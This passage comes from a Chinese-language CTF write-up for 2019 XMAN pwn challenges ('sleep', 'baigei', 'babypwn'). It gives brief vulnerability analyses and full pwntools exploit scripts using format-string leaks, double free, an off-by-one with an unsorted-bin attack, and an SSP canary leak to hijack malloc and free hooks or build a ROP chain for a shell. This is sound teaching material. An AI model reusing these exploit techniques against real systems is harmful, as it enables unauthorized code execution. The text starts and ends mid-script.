comment" spellcheck="true">#4</span>cancel<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>cancel<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(p)         # 改以释放的chunk的fd为我们刚才伪造的chunk的地址</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    vote<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>one_gadget <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45216</span><span class="token punctuation">,</span><span class="token number">0x4526a</span><span class="token punctuation">,</span><span class="token number">0xf02a4</span><span class="token punctuation">,</span><span class="token number">0xf1147</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true"># gdb.attach(p)</span>add<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">'\x44'</span><span class="token operator">*</span><span class="token number">0x50</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">'\x44'</span><span class="token operator">*</span><span class="token number">0x50</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libcbase<span class="token operator">+</span>one_gadget<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(p)</span>cancel<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h1><h2 id="0x01-查看文件-4"><a href="#0x01-查看文件-4" class="headerlink" title="0x01 查看文件"></a>0x01 查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/01/2019-xman-dong-ling-ying-jie-ying-sai/11.png"></div>保护全开<h2 id="0x02-IDA分析-2"><a href="#0x02-IDA分析-2" class="headerlink" title="0x02 IDA分析"></a>0x02 IDA分析</h2><p>格式化字符串：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/01/2019-xman-dong-ling-ying-jie-ying-sai/12.png"></div>double free：<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/01/2019-xman-dong-ling-ying-jie-ying-sai/13.png"></div><h2 id="0x03-思路-3"><a href="#0x03-思路-3" class="headerlink" title="0x03 思路"></a>0x03 思路</h2><p>思路是先通过格式化字符串将libc地址泄露出来，然后利用double free改free_hook为one_gadget地址便可以getshell</p><h2 id="0x04-exp-4"><a href="#0x04-exp-4" class="headerlink" title="0x04 exp"></a>0x04 exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true"># p = process("./sleep")</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"121.37.10.245"</span><span class="token punctuation">,</span><span class="token number">2333</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc-2.27.so"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./sleep"</span><span class="token punctuation">)</span>one_gadgets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f2c5</span><span class="token punctuation">,</span><span class="token number">0x4f322</span><span class="token punctuation">,</span><span class="token number">0x10a38c</span><span class="token punctuation">]</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>info<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"size of story: \n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"the story: \n"</span><span class="token punctuation">,</span>info<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"index:\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"name?\n"</span><span class="token punctuation">,</span><span class="token string">"%p.%p.%p.%p.aaaa%p"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">".aaaa0x"</span><span class="token punctuation">)</span>libc_address <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> libc_address <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"_IO_2_1_stderr_"</span><span class="token punctuation">]</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"ID.\n"</span><span class="token punctuation">,</span><span class="token string">"shin"</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"libc address:"</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>one_gadget <span class="token operator">=</span> one_gadgets<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc<span class="token punctuation">.</span>addresscreate<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x30</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token operator">*</span><span class="token number">0x30</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># print "hook address: ",hex(libc.symbols["__malloc_hook"])</span>create<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(p)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="baigei"><a href="#baigei" class="headerlink" title="baigei"></a>baigei</h1><h2 id="0x01-查看文件-5"><a href="#0x01-查看文件-5" class="headerlink" title="0x01 查看文件"></a>0x01 查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/01/2019-xman-dong-ling-ying-jie-ying-sai/14.png"></div>保护全开<p>考点： off by one、global max fast</p><h2 id="0x02-IDA分析-3"><a href="#0x02-IDA分析-3" class="headerlink" title="0x02 IDA分析"></a>0x02 IDA分析</h2><p>这个题比较有意思：首先这个题将max_fastbin的阈值改为0，所以只要释放chunk就会有main_arena地址，所以很容易就可以得到libc地址，但是这个也是在最后才发现。。。。</p><p>然后题目中有一个off by one的漏洞：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/01/2019-xman-dong-ling-ying-jie-ying-sai/15.png"></div><h2 id="0x03-思路-4"><a href="#0x03-思路-4" class="headerlink" title="0x03 思路"></a>0x03 思路</h2><p>首先将libc地址泄露，利用unsorted bin attack改global_max_fast的值，最后在利用fastbin attack来改hook（注意要create的时候改）而这里global_max_fast阈值为0，所以很好修改。</p><h2 id="0x04-exp-5"><a href="#0x04-exp-5" class="headerlink" title="0x04 exp"></a>0x04 exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding = "utf-8"</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"split"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true"># p = process("./baigei")</span><span class="token comment" spellcheck="true">#p = remote("139.9.101.41",2333)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./baigei"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./baigei"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span><span class="token punctuation">)</span>gadgets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45216</span><span class="token punctuation">,</span><span class="token number">0x4526a</span><span class="token punctuation">,</span><span class="token number">0xf02a4</span><span class="token punctuation">,</span><span class="token number">0xf1147</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>info<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"size: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"data: "</span><span class="token punctuation">,</span>info<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>info<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"data: "</span><span class="token punctuation">,</span>info<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#leak libc</span>create<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x38</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 0</span>create<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 1</span>create<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">7</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 2</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">13</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 3</span>create<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token string">"e"</span><span class="token operator">*</span><span class="token number">0x48</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 4</span>create<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">"f"</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 5</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">13</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 5</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">13</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 5</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">,</span><span class="token string">"e"</span><span class="token operator">*</span><span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 0 #因为这个题的global_max_fast改掉了，所以我们直接可以删除再创建在输出获得libc</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"e"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">88</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span> <span class="token operator">-</span>  <span class="token number">0x10</span><span class="token keyword">print</span> <span class="token string">"libc address: "</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># unsorted bin attack modify global_max_fast</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span><span class="token string">'\x41'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(p)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>global_max_fast <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">0x7ffff7dd37f8</span><span class="token operator">-</span><span class="token number">0x7ffff7a0d000</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x2a</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p16<span class="token punctuation">(</span><span class="token punctuation">(</span>global_max_fast<span class="token number">-0x10</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#1</span><span class="token comment" spellcheck="true">#change global_max_fast</span>create<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">88</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 这里类似于创建size a和b的两个chunk，此时将a的size改为a+b，再释放掉这个a+b的size，同时再释放掉后面的b的chunk，再分配a+b size的chunk，那么就可以对后面的size b的chunk任意修改，unsorted bin attack</span><span class="token comment" spellcheck="true">#get shell</span>edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'e'</span><span class="token operator">*</span><span class="token number">0x48</span><span class="token operator">+</span><span class="token string">'\x51'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0x23</span><span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">0x13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span>gadgets<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>realloc <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'realloc'</span><span class="token punctuation">]</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x13</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span>gadgets<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>realloc<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"size: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h1><h2 id="0x01-查看文件-6"><a href="#0x01-查看文件-6" class="headerlink" title="0x01 查看文件"></a>0x01 查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/01/2019-xman-dong-ling-ying-jie-ying-sai/16.png"></div>考点：canary ssp leak<h2 id="0x02-IDA分析-4"><a href="#0x02-IDA分析-4" class="headerlink" title="0x02 IDA分析"></a>0x02 IDA分析</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/01/2019-xman-dong-ling-ying-jie-ying-sai/17.png"></div>程序逻辑比较简单，大致是主函数中可以创建三次线程，不退出。waitpid：暂时停止目前进程的执行，直到有信号来到或子进程结束也就是三次子线程都执行后才可以退出，看到这里有个溢出漏洞。<h2 id="0x03-思路-5"><a href="#0x03-思路-5" class="headerlink" title="0x03 思路"></a>0x03 思路</h2><p>ssp leak。通过这个方式来打印出libc和canary。第一次打印出libc，第二次打印出tls的canary，第三次就可以溢出了，rop来getshell了。</p><p>但由于什么原因不清楚，打印出的canary不是真正栈上canary，目前还不知道怎么回事。</p><h2 id="0x04-exp-6"><a href="#0x04-exp-6" class="headerlink" title="0x04 exp"></a>0x04 exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#/coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true"># context.terminal = ["tmux","split","-h"]</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./babypwn"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./babypwn"</span><span class="token punctuation">)</span>offset <span class="token operator">=</span> <span class="token number">0x1000</span>main_addr <span class="token operator">=</span> <span class="token number">0x400B22</span>fork_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'fork'</span><span class="token punctuation">]</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x118</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fork_got<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"*** stack smashing detected ***: "</span><span class="token punctuation">)</span>fork <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>fork<span class="token punctuation">)</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> fork<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'fork'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>tls <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token number">0x7ffff7fdc728</span> <span class="token operator">-</span> <span class="token number">0x7ffff7a0d000</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x118</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>tls<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"*** stack smashing detected ***: "</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> u64<span class="token punctuation">(</span><span class="token string">'\x00'</span><span class="token operator">+</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span>sh <span class="token operator">=</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span>system <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x0000000000400763</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>canary<span class="token operator">>></span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"b"</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token 